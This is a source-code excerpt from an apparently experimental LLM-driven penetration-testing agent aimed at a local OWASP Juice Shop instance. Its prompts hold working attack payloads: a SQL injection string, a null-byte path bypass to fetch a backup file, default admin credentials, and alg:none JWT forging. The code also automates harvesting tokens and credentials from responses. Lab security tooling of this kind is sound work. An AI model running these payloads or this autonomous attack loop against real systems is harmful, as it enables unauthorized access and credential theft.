    const latestJwt = jwtFindings.length > 0 ? jwtFindings[jwtFindings.length - 1].value : '';
    const credFindings = this.state.findings.filter(f => f.type === 'credential');
    const hasValidJwt = !!(latestJwt && latestJwt.split('.').length === 3);

    const jwtWarning = hasValidJwt
      ? `\n## CRITICAL: JWT Token EXISTS in context above
You already have a valid JWT in ## ALL JWT TOKENS section.
To use: -H "Authorization: Bearer ${latestJwt}"
DO NOT re-authenticate - use the JWT you have!\n`
      : '\n## No JWT in context - authenticate via /rest/user/login if needed.\n';

    const credWarning = credFindings.length > 0
      ? `\n## Credentials in context:\n${credFindings.map(f => `- ${f.value} (${f.source})`).join('\n')}\n`
      : '';

    const jwtFilePath = `${process.env.HOME}/exploit-reports/${this.mission.missionId}/current_jwt.txt`;
    const jwtTokenCmd = `$(cat ${jwtFilePath} | tr -d '\n')`;

    const completedCmds = this.commandHistory.map(e => `[${e.exit_code}] ${e.cmd.substring(0, 100)}`).join('\n');
    const todoSnapshot = this.todoStore.getSnapshot();

    const prompt = `## MISSION STATUS
- Target: ${this.mission.targetUrl}
- Phase: ${this.state.phase}
- Iteration: ${this.state.iteration}/${this.mission.maxIterations}
- Commands run: ${this.commandHistory.length}
- Findings: ${this.state.findings.length}
- JWT: ${this.hasValidJwt() ? 'VALID (in context above)' : 'MISSING'}

## COMPLETED TASKS (do NOT repeat - from todo store)
${todoSnapshot}

## COMPLETED COMMANDS (do NOT repeat these)
${completedCmds || 'No commands run yet'}

## Context
${context}

## JWT Token Usage
When using JWT in a command, use shell substitution:
-H "Authorization: Bearer ${jwtTokenCmd}

## CRITICAL RULES
- ALWAYS check TODO SNAPSHOT above - completed tasks must NOT be re-planned
- NEVER repeat commands from COMPLETED COMMANDS or TODO above
- NEVER try to read/write JWT files - system handles caching
- NEVER type a JWT directly - ALWAYS use ${jwtTokenCmd}
- If JWT exists in context, USE IT instead of re-authenticating
- If Python/import fails for JWT forging, use bash base64 method IMMEDIATELY - do NOT re-plan!

## Task
Decide the next single command. Output in XML format with <r> for reasoning and <c> for command.

## Output Format (XML only)
<r>Brief reasoning - try something NEW not in COMPLETED COMMANDS</r>
<c>curl -s "http://127.0.0.1:3000/api/Products"</c>

## Rules
- <c> must contain ONLY the command, no explanations
- Target: ${this.mission.targetUrl}
- When using JWT, ALWAYS use: -H "Authorization: Bearer ${jwtTokenCmd}
- NEVER repeat commands from COMPLETED COMMANDS
- If stuck, explore new endpoints

## Quick Ref
- Auth: curl -s -X POST "http://127.0.0.1:3000/rest/user/login" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
- FTP: curl -s "http://127.0.0.1:3000/ftp/package.json.bak%2500.md"
- Using JWT: curl -s "http://127.0.0.1:3000/api/Users" -H "Authorization: Bearer ${jwtTokenCmd}"
- SQLi (URL ENCODE!): curl -s -G "http://127.0.0.1:3000/rest/products/search" --data-urlencode "q=' OR 1=1--"
- alg:none JWT: base64-encode header and payload with alg=none, concatenate with '.', use in Authorization header
`;

    const messages: LLMMessage[] = [
      { role: 'system', content: this.systemPrompt },
      { role: 'user', content: prompt },
    ];

    try {
      const response = await this.complete(messages, 0.5);
      this.writeLLMOutput(`cmd_iter${this.state.iteration}`, response);

      let cmd = this.extractXML(response, 'c');
      if (!cmd || cmd === 'WAIT') {
        this.memory.log(`No useful command from LLM, trying exploration\n`);
        cmd = `curl -s "http://127.0.0.1:3000/api/Products"`;
      }

      cmd = cmd.trim();

      if (cmd.includes('/rest/user/login') && this.hasValidJwt()) {
        this.memory.log(`RE-AUTH BLOCKED: Valid JWT cached, forcing new exploration\n`);
        return await this.decideNextCommandWithContext(context, 'RE-AUTH BLOCKED: JWT already valid. Try protected endpoints with the JWT instead.');
      }

      const normalizedCmd = cmd;

      if (normalizedCmd.startsWith('H=') || normalizedCmd.includes('alg:none') || !normalizedCmd.includes('curl')) {
        return cmd;
      }

      const alreadyRunEntry = this.commandHistory.find(e => {
        if (e.cmd === normalizedCmd) return true;
        return false;
      });
      if (alreadyRunEntry) {
        const prevResult = alreadyRunEntry.stdout.substring(0, 300);
        this.memory.log(`CMD ALREADY RUN (exact match): ${normalizedCmd.substring(0, 60)}. Providing result and asking for different approach.\n`);
        return await this.decideNextCommandWithContext(context, `ALREADY RAN (exact command): ${normalizedCmd.substring(0, 80)}\nPREV RESULT: ${alreadyRunEntry.exit_code} | ${prevResult}\nTry a DIFFERENT payload or endpoint.`);
      }
      return cmd;
    } catch (e) {
      this.memory.log(`Command decision failed: ${e}\n`);
      return null;
    }
  }

  private async decideNextCommandWithContext(context: string, extraNote: string): Promise<string | null> {
    const jwtFilePath = `${process.env.HOME}/exploit-reports/${this.mission.missionId}/current_jwt.txt`;
    const jwtTokenCmd = `$(cat ${jwtFilePath} | tr -d '\n')`;

    const prompt = `## Context
${context}

## MISSION STATUS
- Target: ${this.mission.targetUrl}
- Phase: ${this.state.phase}
- Iteration: ${this.state.iteration}/${this.mission.maxIterations}
- Commands run: ${this.commandHistory.length}
- Findings: ${this.state.findings.length}
- JWT Status: ${this.hasValidJwt() ? 'VALID - stored in file' : 'MISSING'}

## COMPLETED COMMANDS (do NOT repeat these endpoints/actions)
${this.commandHistory.slice(-10).map((e, i) => `${i + 1}. [${e.exit_code}] ${e.cmd.substring(0, 100)}`).join('\n')}

## IMPORTANT NOTE
${extraNote}

## JWT Token Usage
When using JWT in a command, use shell substitution:
-H "Authorization: Bearer ${jwtTokenCmd}

## CRITICAL RULES
- NEVER repeat endpoints/actions from COMPLETED COMMANDS above
- NEVER try to read/write JWT files
- NEVER type a JWT directly - always use shell substitution
- If JWT is valid, USE IT for protected endpoints instead of re-authenticating

## Task
Decide a DIFFERENT command that hasn't been tried. Output in XML format.

## Output Format (XML only)
<r>Brief reasoning - try something NEW based on what completed above</r>
<c>curl -s "http://127.0.0.1:3000/api/Products"</c>`;

    const messages: LLMMessage[] = [
      { role: 'system', content: this.systemPrompt },
      { role: 'user', content: prompt },
    ];

    try {
      const response = await this.complete(messages, 0.5);
      this.writeLLMOutput(`cmd_retry_iter${this.state.iteration}`, response);

      let cmd = this.extractXML(response, 'c');
      if (!cmd || cmd === 'WAIT') {
        cmd = `curl -s "http://127.0.0.1:3000/api/Products"`;
      }

      cmd = cmd.trim();

      if (cmd.includes('/rest/user/login') && this.hasValidJwt()) {
        return await this.decideNextCommandWithContext(context, 'RE-AUTH BLOCKED again. Use JWT for protected endpoints.');
      }

      const alreadyRunEntry = this.commandHistory.find(e => e.cmd === cmd);
      if (alreadyRunEntry) {
        return await this.decideNextCommandWithContext(context, `STILL ALREADY RAN: ${cmd.substring(0, 60)}. You must try something completely different!`);
      }

      return cmd;
    } catch (e) {
      this.memory.log(`Command decision (retry) failed: ${e}\n`);
      return null;
    }
  }

  private async analyzeResult(
    command: string,
    result: { stdout: string; stderr: string; exit_code: number },
    _context: string
  ): Promise<{ findings: Array<{ type: string; value: string; source: string; timestamp: number }>; summary: string }> {
    const stdout = result.stdout;
    const prompt = `## RESPONSE (stdout only - NOT the command)\n${stdout.substring(0, 3000)}\n\n## Stderr\n${result.stderr.substring(0, 500)}\n\n## Exit Code: ${result.exit_code}\n\n## Task\nAnalyze the RESPONSE (stdout) only for:\n- JWT tokens (eyJ... patterns) - extract COMPLETE token from response\n- Credentials/passwords/API keys - only if in the RESPONSE\n- Exposed endpoints or APIs\n- Vulnerabilities confirmed\n- Successful exploitation\n\n## CRITICAL RULES\n- ONLY analyze the RESPONSE (stdout) - do NOT look at the command itself\n- JWT tokens in the command's Authorization header are NOT new findings\n- For JWT: extract from response JSON (e.g., authentication.token field)\n- For credentials: only if EXACT string appears in response\n- If nothing valuable in response, output empty findings array\n\n## Output Format (JSON)\n{\n  "findings": [{"type": "jwt|credential|endpoint|vulnerability|info|raw_output", "value": "value", "source": "where found"}],\n  "summary": "1-sentence summary"\n}`;

    const messages: LLMMessage[] = [
      { role: 'system', content: 'You are an expert pen tester analyzer. Output ONLY JSON.' },
      { role: 'user', content: prompt },
    ];

    try {
      const response = await this.complete(messages, 0.3);
      this.writeLLMOutput(`analysis_iter${this.state.iteration}`, response);

      const jsonMatch = response.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        return {
          findings: (parsed.findings || []).map((f: { type: string; value: string; source?: string }) => ({
            ...f,
            timestamp: Date.now(),
          })),
          summary: parsed.summary || 'Command executed',
        };
      }
    } catch {
      // ignore
    }

    const jwtMatch = result.stdout.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
    if (jwtMatch) {
      return {
        findings: [{
          type: 'jwt' as const,
          value: jwtMatch[0],
          source: 'direct stdout extraction',
          timestamp: Date.now(),
        }],
        summary: 'JWT token found in response',
      };
    }

    return {
      findings: [],
      summary: `Exit ${result.exit_code} | ${result.stdout.length} bytes`,
    };
  }

  private writeLLMOutput(suffix: string, content: string): void {
    const outputPath = `${process.env.HOME}/exploit-reports/${this.mission.missionId}/llm_${suffix}.md`;
    fs.writeFileSync(outputPath, content);
    this.memory.log(`LLM output saved: llm_${suffix}.md\n`);
  }

  private saveFinalReport(): void {
    const reportPath = `${process.env.HOME}/exploit-reports/${this.mission.missionId}/report.md`;
    const findings = this.memory.getFindings();

    let report = `# Gamma Experimental Report\n\n`;
    report += `Target: ${this.mission.targetUrl}\n`;
    report += `Iterations: ${this.state.iteration}\n`;
    report += `Commands: ${this.commandHistory.length}\n`;
    report += `Findings: ${findings.length}\n\n`;

    report += `## Findings\n\n`;
    for (const f of findings) {
      report += `- [${f.type}] ${f.value}\n`;
    }

    report += `\n## All Commands\n\n`;
    for (const entry of this.commandHistory) {
      report += `- \`${entry.cmd}\` → ${entry.exit_code}\n`;
    }

    fs.writeFileSync(reportPath, report);
    console.log(`[GE] Report: ${reportPath}`);
  }
}
